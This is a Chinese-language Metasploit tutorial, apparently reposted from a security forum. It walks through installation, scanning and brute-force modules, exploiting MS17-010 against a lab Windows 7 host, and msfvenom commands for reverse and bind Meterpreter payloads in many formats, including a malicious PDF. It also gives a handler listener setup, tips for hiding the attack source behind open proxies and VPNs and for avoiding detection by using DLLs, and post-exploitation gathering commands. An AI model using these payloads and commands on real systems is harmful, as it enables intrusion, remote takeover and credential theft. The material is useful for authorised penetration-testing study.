> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [tttang.com](https://tttang.com/archive/1432/)

### [一、msf安装与更新](#toc_msf)

**在服务器或者虚拟机执行**(linux)

> curl [https://raw.githubusercontent.com/rapid7/metasploitomnibus/master/config/templates/metasploit-frameworkwrappers/msfupdate.erb](https://raw.githubusercontent.com/rapid7/metasploitomnibus/master/config/templates/metasploit-frameworkwrappers/msfupdate.erb) > msfinstall
> 
> chmod 755 msfinstall
> 
> ./msfinstall

![image-20220202000955061.png](https://storage.tttang.com/media/attachment/2022/02/05/3abb7312-e41a-4065-a07e-ad509cb1d8f8.png)

**然后验证是否安装成功**

**输入msfconsole**

![image-20220202001048264.png](https://storage.tttang.com/media/attachment/2022/02/05/028f4865-88ec-4bff-9369-60f59f9309c3.png)

Windows安装

[点击下载](https://windows.metasploit.com/metasploitframework-latest.msi) [https://windows.metasploit.com/metasploitframework-latest.msi](https://windows.metasploit.com/metasploitframework-latest.msi)

**安装**

解压安装包后直接点击安装

![image-20220202002024880.png](https://storage.tttang.com/media/attachment/2022/02/05/b8173f07-96db-4afe-b2ba-2308bdc18208.png)

添加环境变量

![image-20220202002100966.png](https://storage.tttang.com/media/attachment/2022/02/05/b605daff-808e-402d-b203-6fccc3489840.png)

**使用**

打开终端输入`msfconsole`直接使用

### [二、更新msf](#toc_msf_1)

> 在目录内运行命令`./msfupdate`
> 
> 运行命令`apt update`,`apt install metasploit-framework`

如果./msfupdate不能执行 就把 /opt/metasploit-framework/bin/msfupdate 文件里面的 --allow-downgrades 参 数给去除掉，就可以更新了。

### [三、msf七大模块介绍](#toc_msf_2)

msf有很多模块 一共有7个

![image-20220202003208833.png](https://storage.tttang.com/media/attachment/2022/02/05/f9e9e8d2-ebb8-4afb-a388-d86befe3f6e4.png)

> 命令：ls /opt/metasploit-framework/embedded/framework/modules/ -al

auxiliary 辅助模块，该模块是用于辅助渗透的，比如端口扫描、存活探测、暴力破解、扫描、发掘漏洞、探测信息等工作。

encoders 编码器模块，对payload进行编码加密，可绕过部分杀软软件，将攻击载荷进行编码（类似与加密），让避免操作系统和杀毒软件辨认出来但是会让载荷的体积变大，这个时候需要选择传输器和传输体配对成的攻击载荷来下载目标载荷并且运行。。

evasion 躲避模块，该模块分类下只有4个，都是为了躲避微软的限制或者是杀软 的，免杀效果很一般。

exploits 漏洞利用模块，这个模块通常是用于对某些有可能存在漏洞的目标进行漏洞利用，利用已发现的漏洞对远程目标系统进行攻击，植入并运行攻击载荷，从而控制目标系统。

nops 空指令模块，为了避免攻击载荷在执行的过程中出现随机地址和返回地址错误而在执行shellcode之前加入一些空指令，使得在执行shellcode时有一个较大的安全着陆区。。

payloads 攻击载荷，exploit成功之后就会执行payload，这段payload可以是反弹 代码，可以是添加用户的代码，在渗透攻击触发漏洞后劫持程序执行流程并跳入的这段代码。本模块的作用是消除安全工作人员开发这部分代码的代价。

post 后渗透模块，该模块一般用于内网渗透。

### [四、msf之auxiliary常用模块演示](#toc_msfauxiliary)

先查看auxiliary的功能模块

![image-20220202005949109.png](https://storage.tttang.com/media/attachment/2022/02/05/319f878c-6349-44a2-84dc-bfe731579bd8.png)

Metasploit的辅助模块主要用于信息搜集阶段，功能包括扫描、口令猜解、敏感信息嗅探、FUZZ测试发掘漏洞、实施网络协议欺骗等

**_*auxiliary模块命名规则*_**

命名规则：功能/服务/模块名称

例如： scanner/discovery/arp_sweep

**一、辅助模块(auxiliary)分为三个大类**

_1、Admin_

*   Admin/HTTP模块
    
*   Admin/MSSQL模块
    
*   Admin/MySQL模块
    
*   Admin/Postgres模块
    
*   Admin/VMWare模块
    

_2、Scanner_

*   DCERPC
    
*   Discovery
    
*   FTP
    
*   HTTP
    
*   IMAP
    
*   MSSQL
    
*   MySQL
    
*   NetBIOS
    
*   POP3
    
*   SMB
    
*   SMTP
    
*   SNMP
    
*   SSH
    
*   Telnet
    
*   TFTP
    
*   VMWare
    
*   VNC
    

_3、Server_

*   捕获模块

**二、Admin例子**

1、查找关于mysql的辅助模块

![image-20220202125200330.png](https://storage.tttang.com/media/attachment/2022/02/05/93df0d43-42be-4b47-b6b4-fda085c47c94.png)

2、选择auxiliary/admin/mysql/mysql_sql

use 1

3、查看需要设置的参数

![image-20220202125220394.png](https://storage.tttang.com/media/attachment/2022/02/05/883f067d-219e-4b97-8615-30e4ac3a5b15.png)

4、设置目标主机、用户名和密码，

5、run，执行

![image-20220202125236483.png](https://storage.tttang.com/media/attachment/2022/02/05/b4e835a5-e0e4-4e88-95bd-52045ae86f31.png)

其他的就不演示了

**三、scanner例子**

**_常用扫描模块及功能_**

*   auxiliary/scanner/portscan 端口扫描  
    auxiliary/scanner/smb/smb_version SMB系统版本扫描  
    auxiliary/scanner/smb/smb_enumusers SMB枚举  
    auxiliary/scanner/smb/smb_login SMB弱口令扫描  
    auxiliary/admin/smb/psexec_command SMB登录且执行命令  
    auxiliary/scanner/ssh/ssh_login ssh登录测试  
    scanner/ mssq/mssql_ping MSSQL主机信息扫描  
    admin/mssql/mssql_enum MSSQL枚举  
    admin/mssql/mssql_exec MSSQL执行命令  
    admin/mssql/mssql_sql MSSQL查询  
    scanner/mssql/mssql_login MSSQL弱口令扫描  
    auxiliary/admin/mysql/mysql_enum MYSQL枚举  
    auxiliary/admin/mysql/mysql_sql MYSQL语句执行  
    auxiliary/scanner/mysql/mysql_login MYSQL弱口令扫描  
    auxiliary/scanner/smtp/smtp_version SMTP版本扫描  
    auxiliary/scanner/smtp/smtp_enum SMTP枚举  
    auxiliary/scanner/snmp/community SNMP扫描设备  
    auxiliary/scanner/telnet/telnet_login TELNET登录  
    scanner/vnc/vnc_none_auth VNC空口令扫描
    
*   arp扫描  
    search arp  
    use auxiliary/scanner/discovery/arp_sweep  
    set interface rhost shost smac threads  
    run
    
*   端口扫描  
    search portscan  
    use auxiliary/scanner/portscan/syn  
    set interface posts rhosts threads  
    run
    
*   密码嗅探  
    use auxiliary/sniffer/psnuffle  
    支持从pcap抓包文件中提取密码  
    功能类似于dsniff  
    目前只支持pop3 imap ftp http_get协议
    
*   SNMP扫描  
    vi /etc/default/snmpd 侦听地址修改为0.0.0.0  
    use auxiliary/scanner/snmp_login  
    use auxiliary/scanner/snmp_enum  
    use auxiliary/scanner/snmp_enumusers （windows）  
    use auxiliary/scanner/snmp_enumshares （windows）
    
*   smb  
    smb版本扫描  
    use auxiliary/scanner/smb/smb_version  
    扫描命名管道，判断smb服务类型（账号、密码）  
    use auxiliary/scanner/smb/pipe_auditor  
    smb共享枚举（账号、密码）  
    use auxiliary/scanner/smb/smb_enumshares  
    smb用户枚举（账号、密码）  
    use auxiliary/scanner/smb/smb_enumusers  
    sid枚举（账号、密码）  
    use auxiliary/scanner/smb/smb_lookupsid
    
*   ssh  
    SSH版本扫描  
    use auxiliary/scanner/ssh/ssh_version  
    SSH密码爆破  
    use auxiliary/scanner/ssh/ssh_login  
    set userpass_file /usr/share/metasploit-framework/data/wordlist/root_userpass.txt  
    set verbose false  
    run  
    ssh -l root  
    ssh 192.168.0.11  
    ssh -l root 192.168.0.11  
    ssh root@192.168.0.11  
    ssh -p 12333 192.168.0.11  
    ssh -l root -p 12333 216.230.230.114  
    ssh -p 12333 root@216.230.230.114  
    SSH公钥登录  
    use auxiliary/scanner/ssh/ssh_login_pubkey  
    set key_file di_rsa  
    set username root  
    run
    
*   mssql  
    Mssql扫描端口  
    TCP 1433 （动态端口）/UDP 1434 （查询TCP端口号）  
    use auxiliary/scanner/mssql_ping  
    爆破mssql密码  
    use auxiliary/scanner/mssql_login  
    远程代码执行  
    use auxiliary/admin/mssql/mssql_exec  
    set cmd net user pass /add
    
*   ftp  
    ftp版本扫描  
    use auxiliary/scanner/ftp/ftp_version  
    use auxiliary/scanner/ftp/anonymous  
    use auxiliary/scanner/ftp/ftp_login
    
*   vnc  
    VNC：虚拟网络控制台，是一款优秀的远程控制工具软，基于 UNIX 和 Linux 操作系统的免费的开源软件，远程控制能力强大，高效实用，其性能可以和 Windows 和 MAC 中的任何远程控制软件媲美  
    vnc密码破解  
    use auxiliary/scanner/vnc/vnc_login  
    vnc无密码访问  
    use auxiliary/scanner/vnc/vnc_none_auth
    
*   rdp  
    RDP远程桌面漏洞  
    use auxiliary/scanner/rdp/ms12_020_check  
    -检查不会造成dos攻击
    
*   设备后门  
    use auxiliary/scanner/ssh/juniper_backdoor  
    use auxiliary/scanner/ssh/fortine_backdoor
    
*   HTTP弱点扫描  
    过期证书  
    use auxiliary/scanner/http/cert  
    显示目录及文件  
    use auxiliary/scanner/http/dir_listing  
    use auxiliary/scanner/http/files_dir  
    WEBDAV Unicode编码身份验证绕过  
    IIS的WebDAV功能在解析URI并发送回数据时没有正确地处理Unicode令牌环，远程攻击者可以通过提交恶意HTTPGET请求绕过受口令保护的文件夹的认证，或在受口令保护的WebDAV目录中列出、上传或下载文件  
    use auxiliary/scanner/http/dir_webdav_unicode_bypass
    
*   tomcat管理登录页面  
    use auxiliary/scanner/http/tomcat_mgr_login
    
*   基于http方法的身份验证绕过  
    use auxiliary/scanner/http/tomcat_auth_bypass
    
*   wordpress密码爆破  
    use auxiliary/scanner/http/wordpress_login_enum  
    set uri /wordpress/wp-login.php
    
*   wmap web应用扫描器  
    [https://www.cnblogs.com/kyx599/p/12936169.html](https://www.cnblogs.com/kyx599/p/12936169.html)
    
*   telnet爆破  
    use auxiliary/scanner/telnet/telnet_login
    

#### [_端⼝扫描_](#toc_)

*   ACK 通过ACK扫描的方式对防火墙上未屏蔽的端口进行探测
*   ACK防⽕墙扫描 auxiliary/scanner/portscan/ack
*   ftpbounce 通过FTPbounce攻击的原理对TCP服务进行枚举，一些新的FTP服务器 软件能够很好的防范FTPbounce攻击，但在一些旧的Solaris及FreeBSD系统的FTP服务中 此类工具方法仍能够被利用
*   FTP跳端⼝扫描 auxiliary/scanner/portscan/ftpbounce
*   syn 使用发送TCP SYN标志的方式探测开放的端口
*   SYN端⼝扫描 auxiliary/scanner/portscan/syn
*   tcp 通过一次完整的TCP连接来判断端口是否开放，这种扫描方式最准确， 但扫描速度较慢
*   TCP端⼝扫描 auxiliary/scanner/portscan/tcp
*   xmas 一种更为隐秘的扫描方式，通过发送FIN,PSH,和URG标志，能够躲避 一些高级的TCP标记检测器的过滤
*   TCP-XMas端⼝扫描 auxiliary/scanner/portscan/xmas

**_TCP端⼝扫描：auxiliary/scanner/portscan/tcp_**

![image-20220202150939018.png](https://storage.tttang.com/media/attachment/2022/02/05/e9c72480-cfa6-4c69-a0c0-35725fede690.png)

![image-20220202152627022.png](https://storage.tttang.com/media/attachment/2022/02/05/9d647f0c-0dc5-413a-ad32-086f15e16aec.png)

扫描结束 192.168.1.14的开放端口

![image-20220202152736157.png](https://storage.tttang.com/media/attachment/2022/02/05/336c8f28-631d-49fb-983e-a091da39db70.png)

**_ACK防⽕墙扫描：auxiliary/scanner/portscan/ack_**

![image-20220202153306378.png](https://storage.tttang.com/media/attachment/2022/02/05/e9a8962e-c0e2-43d0-9d81-de5bfb1c4903.png)

![image-20220202153327426.png](https://storage.tttang.com/media/attachment/2022/02/05/32aa3df7-5fe5-4bbc-ba11-24d3dea184d5.png)

![image-20220202153603820.png](https://storage.tttang.com/media/attachment/2022/02/05/48531145-2ca5-498e-b1af-de676c4fe98c.png)

⽤ACK扫描会分段去发送数据包扫描，才能够绕过⼀些防火墙设备，⽽不是 Windows防火墙！Windows⾃带的防火墙是阻断⼀切进入的连接! 因为虚拟机Windwos 7是吧防火墙关闭了的，如果打开那么防火墙是会阻断 连接的！ 经过测试，Windows防火墙开启，使⽤ACK是扫描不出来的！

![image-20220202153629956.png](https://storage.tttang.com/media/attachment/2022/02/05/7c899050-c522-4ace-8e94-79de56d8d53a.png)

**_FTP跳端⼝扫描 auxiliary/scanner/portscan/ftpbounce_**

![image-20220202154130153.png](https://storage.tttang.com/media/attachment/2022/02/05/a60d0625-2e63-40b1-bfaf-e7cc87fdd10d.png)

这个因为环境情况 就没有演示

详细可参考：[https://blog.csdn.net/asdushf/article/details/111691756](https://blog.csdn.net/asdushf/article/details/111691756)

**_SYN端⼝扫描 auxiliary/scanner/portscan/syn_**

TCP 端口扫描是通过SYN数据包进行的，用于扫描目标机器的端口上是否存在程序监听，通常意义上，普通个人机器上的某个端口如果有程序监听的话，那么它一般是 系统漏洞。由于TCP是一个有连接的可靠协议，所以要使用 三次握手来建立连接， 三次握手的 报文分别是(SYN)、(ACK SYN)和(ACK)。进行 端口扫描时，首先向对方主机的某一端口发送(SYN) 报文，如果对方这一端口上有程序在监听（或者说存在漏洞），则回复(SYN ACK) 报文，否则回复(RST)报文。据此就可以判断对方端口上是否有程序在监听了，或者是否存在漏洞了。  
参考：[https://blog.51cto.com/ksyiwen/1336392](https://blog.51cto.com/ksyiwen/1336392)

![image-20220202155034118.png](https://storage.tttang.com/media/attachment/2022/02/05/5a310ea8-0322-45d6-9578-61ea512ae62e.png)

![image-20220202155048056.png](https://storage.tttang.com/media/attachment/2022/02/05/85425e40-a000-40e2-8926-5d2e45da47ac.png)

**_TCP-XMas端⼝扫描 auxiliary/scanner/portscan/xmas_**

![image-20220202155853690.png](https://storage.tttang.com/media/attachment/2022/02/05/e8b73cd1-6ecb-48f6-9bd1-808d3c061b3d.png)

#### [常见的网络服务扫描](#toc__1)

##### [1.Telnet服务扫描](#toc_1telnet)

![image-20220203001914027.png](https://storage.tttang.com/media/attachment/2022/02/05/01acb9e5-fdd9-4be8-b3ce-5db1064880ed.png)

代码清单3-19中的扫描结果显示，IP地址为10.10.10.254的主机（即网关服务器）开放了Telnet服务，通过返回的服务旗标“Ubuntu 8.041x0ametasploitable login : ”，可以进一步确认出这台主机的操作系统版本为Ubuntu 8.04，而主机名为metasploitable。

##### [2.SSH服务扫描](#toc_2ssh)

![image-20220203002054031.png](https://storage.tttang.com/media/attachment/2022/02/05/221d1e5f-c0ac-4f56-a59b-eaf70219b43c.png)

如代码清单3-20所示，使用Metasploit中的ssh_version辅助模块，很快在网络中定位了两台开放SSH服务的主机，分别是10.10.10.129(网站服务器）和10.10.10.254（网关服务器)，并且显示了SSH服务软件及具体版本号。

#### [3.Oracle数据库服务查点](#toc_3oracle)

![image-20220203002153611.png](https://storage.tttang.com/media/attachment/2022/02/05/3731d0dc-2471-4962-aa66-b4e18839b4a0.png)

#### [4.开放代理探测与利用](#toc_4)

在一些特殊情形的渗透测试工作中，为避免被对方的入侵检测系统跟踪，你很有可能需要隐藏自己的身份。隐藏网络身份的技术很多，比如使用代理服务器(Proxy)、VPN等，不过最简单和最常见的还是使用代理服务器。  
Metasploit提供了open_proxy模块，能够让你更加方便地获取免费的HTTP代理服务器地址。获取免费开放代理之后，就可以在浏览器或者一些支持配置代理的渗透软件中配置代理，这可以在进行渗透测试时隐藏你的真实I地址。其使用方法如代码清单3-22所示。

![image-20220203002320432.png](https://storage.tttang.com/media/attachment/2022/02/05/f66b1ee0-ac6b-4114-b1be-ecde9b531afe.png)

当然，也可以从互联网上搜索一些开放的HTTP、Socks等代理服务器，然后通过代理猎手等专用工具进行验证，并在进行隐蔽性渗透测试的场景中进行使用。比开放代理更保险的隐藏攻击源方法是利用开放的或者自主架设的VPN服务，可以从公开渠道搜集到一些免费的VPN服务，也可以自己在已控制的主机上架设OpenVPN服务。使用这些VPN可以采用加密方式转发路由你的渗透测试数据包，而无需担心你的攻击发起源被跟踪到。

#### [版本扫描](#toc__2)

探测对方操作系统信息：use auxiliary/scanner/smb/smb_version

![image-20220203000138282.png](https://storage.tttang.com/media/attachment/2022/02/05/96bfd4a5-3397-4a3d-b5d4-ceedb07e93ff.png)

可以看到，操作系统是Windows 7,主机名是:FUZHONG,在GOD域内

扫描永恒之蓝ms17010 ：use auxiliary/scanner/smb/smb_ms17_010

![image-20220203000621982.png](https://storage.tttang.com/media/attachment/2022/02/05/c00536d0-16cf-4283-848b-e3933f11c8ac.png)

Host is likely VULNERABLE to MS17-010! 说明是存在永恒之蓝

利用：

可以先用search 搜索一下17010的漏洞利用模块

![image-20220203000827312.png](https://storage.tttang.com/media/attachment/2022/02/05/e9022b0f-7a02-4367-9df8-ec6281197cc9.png)

这里就随便选一个来利用了

![image-20220203001046782.png](https://storage.tttang.com/media/attachment/2022/02/05/cdf3c782-3128-4896-a370-7e77a22c170d.png)

![image-20220203001103253.png](https://storage.tttang.com/media/attachment/2022/02/05/00504507-6a3b-4de6-b598-de4334c656d3.png)

就设置了ip 其他参数默认 然后攻击

![image-20220203001144002.png](https://storage.tttang.com/media/attachment/2022/02/05/1094758c-c0d5-4323-87e6-27cfde451162.png)

尴尬 这里好像失败了 原来是360没关

![image-20220203001014494.png](https://storage.tttang.com/media/attachment/2022/02/05/dab50f4f-2b7e-4445-8886-d4f480800384.png)

之后重新测试

![image-20220203001329774.png](https://storage.tttang.com/media/attachment/2022/02/05/36923638-b8aa-45d7-b03f-359805eebb8d.png)

小tips：这里是set rhosts 是可以设置多个的 可以同时测试多个目标

### [五、msf之Exploits模块常用演示](#toc_msfexploits)

#### [1、显示所有渗透攻击模块](#toc_1)

**show exploits**

![image-20220203004645567.png](https://storage.tttang.com/media/attachment/2022/02/05/52746589-6ca1-43ee-8621-b6b916987ac3.png)

#### [2、查找关于smb的攻击模块](#toc_2smb)

> search name:smb type:exploit

![image-20220203004749932.png](https://storage.tttang.com/media/attachment/2022/02/05/f2d14c50-959f-48f5-8728-fe1ff776cc53.png)

#### [3、查找路径含有smb的模块](#toc_3smb)

> search path:smb

![image-20220203004833122.png](https://storage.tttang.com/media/attachment/2022/02/05/7f897f22-7d77-427c-ace3-524ae5bc7b14.png)

用ms17010演示：exploit/windows/smb/ms17_010_psexec

![image-20220203005318222.png](https://storage.tttang.com/media/attachment/2022/02/05/41ad9aaf-7212-4c67-89c0-78f18c4a8844.png)

可以看到弹回一个会话

![image-20220203005403791.png](https://storage.tttang.com/media/attachment/2022/02/05/c29b117e-8b68-45a0-a679-3b58313e18b9.png)

其他 Exploit模块的操作也是如此 就不演示了

### [六、msf之Payloads模块常用演示](#toc_msfpayloads)

#### [Payloads分类](#toc_payloads)

1、singles：独立载荷，可直接植入目标系统并执行相应的程序，如：shell_bind_tcp这个payload。

2、stagers：传输器载荷，用于目标机与攻击机之间建立稳定的网络连接，与传输体载荷配合攻击。通常该种载荷体积都非常小，可以在漏洞利用后方便注入，这类载荷功能都非常相似，大致分为bind型和reverse型，bind型是需要攻击机主动连接目标端口的；而reverse型是目标机会反连接攻击机，需要提前设定好连接攻击机的ip地址和端口号。

3、stages：传输体载荷，如shell，meterpreter等。在stagers建立好稳定的连接后，攻击机将stages传输给目标机，由stagers进行相应处理，将控制权转交给stages。比如得到目标机的shell，或者meterpreter控制程序运行。这样攻击机可以在本端输入相应命令控制目标机。

#### [显示所有可用payloads](#toc_payloads_1)

![image-20220203011612790.png](https://storage.tttang.com/media/attachment/2022/02/05/f5d7a0b9-b7bf-4378-834f-b62ec032fa6c.png)

Metasploit 生成的 Payload分为正向和反向

#### [最常见的payload](#toc_payload)

*   windows/meterpreter/bind_tcp #正向连接
*   windows/meterpreter/reverse_tcp #反向连接，常用
*   windows/meterpreter/reverse_http #通过监听80端口反向连接
*   windows/meterpreter/reverse_https #通过监听443端口反向连接

#### [反向payload](#toc_payload_1)

反向就是说目标执⾏了我们⽣成的Payload后，会主动连接我们的攻击服务 器MSF

##### [生成木马命令：`msfvenom`](#toc_msfvenom)

**msfvenom详细语法**

*   -e, –encoder [encoder] 指定需要使用的encoder（编码器）  
    -a, –arch < architecture> 指定payload的目标架构  
    –platform < platform> 指定payload的目标平台  
    -s, –space < length> 设定有效攻击荷载的最大长度  
    -b, –bad-chars < list> 设定规避字符集，比如: & #039;\x00\xff& #039;  
    -i, –iterations < count> 指定payload的编码次数  
    -c, –add-code < path> 指定一个附加的win32 shellcode文件  
    -x, –template < path> 指定一个自定义的可执行文件作为模板  
    -k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行  
    –payload-options 列举payload的标准选项  
    -o, –out < path> 保存payload  
    -v, –var-name < name> 指定一个自定义的变量，以确定输出格式  
    –shellest 最小化生成payload  
    -h, –help 查看帮助选项  
    –help-formats 查看msf支持的输出格式列表

##### [生成木马语句](#toc__3)

*   二进制  
    linux:msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > shell.elf
    
*   windows:msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe
    
*   mac: msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.macho
    
*   web  
    php:msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > shell.php cat shell.php | pbcopy && echo '<?php ’ | tr -d ‘\n’ > shell.php && pbpaste >> shell.php
    
*   asp:msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp
    
*   jap:msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp
    
*   war:msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
    
*   脚本  
    python:msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py
    
*   bash:msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh
    
*   perl:msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
    
*   基于pdf的shellcode  
    use exploit/windows/fileformat/adobe_utilprintf  
    msf5 exploit(adobe_utilprintf)>set FILENAME BestComputers-UpgradeInstructions.pdfset
    
*   PAYLOAD windows/meterpreter/reverse_tcp  
    其他的就自己填就好了
    

**LHOST 填写的是攻击机器，也就是Kali的IP LPORT 填写的是端口，一般填写的是高端口，如：6666、4444、8977等等，但是 最好填写一下比较常用的端口，如：80、443、8080等等**

生成shell.exe： msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=5555 -f exe > shell2.exe

![image-20220203012757882.png](https://storage.tttang.com/media/attachment/2022/02/05/5c10dcff-4eac-4492-83df-7be023b0973b.png)

此时在当前⽬录下有⼀个shell2.exe! 因为在前面说了，这是反向连接，那么就需要先在攻击机器上监听，然 后再然后⾁鸡运⾏我们的文件才可以连接！

监听模块：`use exploit/multi/handler`

use exploit/multi/handler

set PAYLOAD windows/meterpreter/reverse_tcp //这个就是和上面msfvenom使用 的payload是一样的

set LHOST 192.168.1.10

set LPORT 5555

run

![image-20220203013100039.png](https://storage.tttang.com/media/attachment/2022/02/05/09758a56-51e2-41ed-b0cf-a0adb34b16ba.png)

接着我们放到Windows7下去执⾏这个⼆进制文件：

![image-20220203013221508.png](https://storage.tttang.com/media/attachment/2022/02/05/014fc9b3-ff2b-4e81-b968-d78d1ae0d434.png)

最后，来看看Metasploit这边的监听情况：

![image-20220203013247770.png](https://storage.tttang.com/media/attachment/2022/02/05/da40d081-b499-4166-a26f-e3f9f2702baa.png)

可以看到，Windows7运⾏了刚刚msfvenom⽣成的shell.exe后， Metasploit这边反弹了⼀个meterpreter会话过来！

这个就是这么⼀个Windows的反向cmdshell 因为刚刚我们所反弹回来了⼀个shell，假设我们要重新监听其他的 payload，那么就可以使⽤background来返回msfconsole控制台窗⼝：

![image-20220203013402729.png](https://storage.tttang.com/media/attachment/2022/02/05/2741f6f6-05a7-433c-8ffe-71bb60ef7001.png)

如果想查看当前连接的session，就可以使⽤sessions查看在后台有哪些连接 了MSF：

![image-20220203013528739.png](https://storage.tttang.com/media/attachment/2022/02/05/59eb598c-a559-494f-90cf-2a8561de5970.png)

如果想进入刚才那个meterperter，那么就sessions后⾯跟他的⼀个id：

![image-20220203013549137.png](https://storage.tttang.com/media/attachment/2022/02/05/2bf0d8ff-14c4-4a3e-b283-c5bb60a0cfd9.png)

这样就进入了刚刚那个cmdshell⾥！

#### [正向payload](#toc_payload_2)

*   使⽤场景

场景还是得具体看，⽐如⽬标机器不给其他除特定端⼝外的端⼝出站，那就 只能能正向；还有⽐如有⼀种情 况，⽬标处于深层⽹络，不能直接连通外⽹，也不能通过其他机器连通，因 为其他机器防⽕墙都开着，为避免 在有防⽕墙监控的情况下关闭防⽕墙⽽被发现，也只能⽤正向的⻢，然后通 过开着防⽕墙的机器来进⾏端⼝的 转发达到穿透的⽬的

##### [msfvenom⽣成正向Paylaod](#toc_msfvenompaylaod)

msfvenom -p windows/meterpreter/bind_tcp LPORT=<Attack Port> -f exe >/root/bind_xx.exe

msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=<Attack Port> -f exe >/root/bind_xx.exe

msfvenom -p windows/meterpreter/bind_tcp LPORT=<Attack Port> -f dll >/root/bind_xx.dll

msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=<Attack Port> -f dll >/root/bind_xx.dll

msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=<Attack Port> -f elf >/root/bind_xx.elf

msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=<Attack Port> -f elf >/root/bind_xx.elf

因为我win7虚拟机是x64位系统，我就⽤这条命令：

msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=5555 -f exe >bind.exe

![image-20220203234222744.png](https://storage.tttang.com/media/attachment/2022/02/05/7476aeca-6b88-49e6-92f2-08821fac792f.png)

在虚拟机上运⾏：bind.exe:

可以看到，已经开放了5555端⼝！

![image-20220203234553779.png](https://storage.tttang.com/media/attachment/2022/02/05/b9ff37bf-d90c-4a62-abfd-4ebcac60122a.png)

接下来打开msfconsole对虚拟机进⾏连接(前提是对⽅防火墙是关闭了的)：

![image-20220203234856726.png](https://storage.tttang.com/media/attachment/2022/02/05/96158459-87b1-4b16-8488-c0c4c448fe01.png)

其中LPORT需要设置为刚刚我们⽣成的Payload⼀样的端⼝，也就是5555: 还要设置⼀个RHOST，也就是⾁鸡Win7的IP:192.168.1.14

最后直接运⾏exoloit

![image-20220203234944995.png](https://storage.tttang.com/media/attachment/2022/02/05/4ec555fe-0c7d-460b-a5d4-053977bc807d.png)

这个时候就反弹回来了⼀个Meterpreter会话回来！

同时，⾁鸡win7那边就没有对5555端⼝进⾏连接了！

![image-20220203235033556.png](https://storage.tttang.com/media/attachment/2022/02/05/68347815-75f5-4ee5-a7d0-cb1808f98fc7.png)

因为⽤了5555端⼝启⽤监听后，只会接收⼀次数据，⽆论成功或者失败，它 都不会再监听了！ 也就是说，如果连接失败了，那么就再运⾏然后再连接⼀次！

这是Metasploit⽣成正向的过程！

##### [尽量不要⽣成exe](#toc_exe)

在真实环境中，如果使⽤msfvenom⽣成了⼀个正向Paylaod格式是exe，那 么在进程中就会暴露！

![image-20220203235139085.png](https://storage.tttang.com/media/attachment/2022/02/05/6b58b42d-42c8-440d-9cd3-60d89f744f35.png)

⼀般⽤就⽤dll！

要运⾏dll必须使⽤rundll32.exe来start:

rundll32.exe文件在C:\Windows\System32\rundll32.exe:

![image-20220203235416805.png](https://storage.tttang.com/media/attachment/2022/02/05/7ac6f61d-a595-48b4-ac9c-ad1a0f183890.png)

**_使用方法就是 rundll32.exe xxx.dll,Start_**

生成一个dll

msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -f dll >bind.dll

![image-20220203235709952.png](https://storage.tttang.com/media/attachment/2022/02/05/f219b056-eb22-4b9c-bf41-d0bc70bf65e7.png)

![image-20220204000003055.png](https://storage.tttang.com/media/attachment/2022/02/05/4b2d4c28-9f41-4d04-88f7-f4ec90f8c9f2.png)

![image-20220204000015393.png](https://storage.tttang.com/media/attachment/2022/02/05/cddbb61a-22f1-44d9-b9d5-23c89f1fd024.png)

⽽Meterpreter这边也是反弹了⼀个shell回来

这就是正向连接

### [七、msf之Post模块常用演示](#toc_msfpost)

#### [后渗透操作](#toc__4)

在获取到一枚Meterpreter的shell之后，就可以进行下一步的渗透，

那msf中的post模块就是⼀个后渗透模块，⾥⾯包含各种后渗透中有可能⽤到的功能，最多的就 是信息收集。

search post

![image-20220204000654465.png](https://storage.tttang.com/media/attachment/2022/02/05/18807157-1e4f-4d7e-ae2b-d3f16a9e9b81.png)

这边就模拟⼀下拿到cmdshell后的操作：

![image-20220204000751985.png](https://storage.tttang.com/media/attachment/2022/02/05/6411a7e5-3151-43c5-8566-6260a5406794.png)

可以看到，我这边sessions是有⼀个meterpreter会话：

在后渗透的时候，我们可以使⽤post模块辅助我们

#### [1、获取目标分区情况](#toc_2)

> run post/windows/gather/forensics/enum_drives

![image-20220204000950563.png](https://storage.tttang.com/media/attachment/2022/02/05/5d4d0343-e396-4100-b9f1-1643a67d58ef.png)

#### [2、检测是否是虚拟主机](#toc_3)

> run post/windows/gather/checkvm

![image-20220204001018933.png](https://storage.tttang.com/media/attachment/2022/02/05/0bfd47f5-2f55-4e29-a91d-6ec1cc69ec80.png)

#### [3、获取当前安装的应用程序](#toc_5)

> run post/windows/gather/enum_applications

![image-20220204001048275.png](https://storage.tttang.com/media/attachment/2022/02/05/fee30cf3-4da1-4ea7-993a-d565ab77a31f.png)

#### [4、获取用户登录信息](#toc_6)

> run post/windows/gather/enum_logged_on_users

![image-20220204001135734.png](https://storage.tttang.com/media/attachment/2022/02/05/e271a7d0-fca1-4b2b-84bc-ee6a97534469.png)

#### [5、收集系统环境信息](#toc_7)

> run post/multi/gather/env

![image-20220204001323935.png](https://storage.tttang.com/media/attachment/2022/02/05/fdc209cf-46e8-4caf-8f66-08d3e6c30d62.png)

#### [6、查看开启的服务](#toc_8)

> run post/windows/gather/enum_services

![image-20220204001409853.png](https://storage.tttang.com/media/attachment/2022/02/05/2fa3f25c-0491-4ebc-809c-d23d56c75de3.png)

#### [7、查看目标主机最近的操作](#toc_9)

> run post/windows/gather/dumplinks

